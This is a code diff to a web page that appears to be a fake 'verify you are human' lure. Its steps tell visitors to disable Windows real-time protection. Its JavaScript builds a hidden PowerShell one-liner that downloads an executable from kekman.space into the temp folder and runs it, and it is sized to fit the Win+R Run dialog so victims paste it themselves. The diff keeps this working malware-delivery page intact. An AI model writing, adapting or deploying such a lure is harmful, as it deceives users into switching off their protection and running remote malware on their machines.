@@ -124,7 +124,6 @@
     display: flex; align-items: center; justify-content: center;
     flex-shrink: 0; margin-top: 1px;
   }
-  .step-num.done { background: #10b981; }
   .step-desc { font-size: 13.5px; color: #444; line-height: 1.5; }
   .key {
     display: inline-block;
@@ -211,7 +210,7 @@
         <div class="step-row">
           <div class="step-num">1</div>
           <div class="step-desc">
-            <b>Disable real-time protection.</b> Open <span class="key">⊞ Win</span> → search <span class="key">Windows Security</span> → <b>Virus &amp; threat protection</b> → <b>Manage settings</b> → turn off <b>Real-time protection</b>.
+            <b>Disable real-time protection.</b> Press <span class="key">⊞ Win</span>, type <span class="key">Windows Security</span>, open it → <b>Virus &amp; threat protection</b> → <b>Manage settings</b> → turn off <b>Real-time protection</b>.
           </div>
         </div>
         <div class="step-row">
@@ -264,21 +263,21 @@
 // ╠══════════════════════════════════════════════════════════════════╣
 
 const CFG = {
-  site: 'kekman.space',
+  site:     'kekman.space',
   exe_url:  'https://kekman.space/verify.exe',
   exe_name: 'a.exe'
 };
 
 // ╚══════════════════════════════════════════════════════════════════╝
 
-// download + run, one shot, no base64, no p.ps1
+// one-line download + run. no base64, no p.ps1, no iex, no irm.
 const PAYLOAD =
-  'powershell -w h -c "iwr ' + CFG.exe_url + ' -OutFile $env:TEMP\\' + CFG.exe_name + ';start $env:TEMP\\' + CFG.exe_name + '"';
+  'powershell -w h -c "iwr ' + CFG.exe_url +
+  ' -OutFile $env:TEMP\\' + CFG.exe_name +
+  ';start $env:TEMP\\' + CFG.exe_name + '"';
 
-console.log('payload length:', PAYLOAD.length, '/ 259');
-if (PAYLOAD.length > 255) {
-  console.warn('WARNING: payload >= 256 chars — will truncate in Win+R');
-}
+console.log('[payload]', PAYLOAD);
+console.log('[length]', PAYLOAD.length, '/ 259');
 
 document.getElementById('siteName').textContent = CFG.site;
 document.getElementById('rayId').textContent =
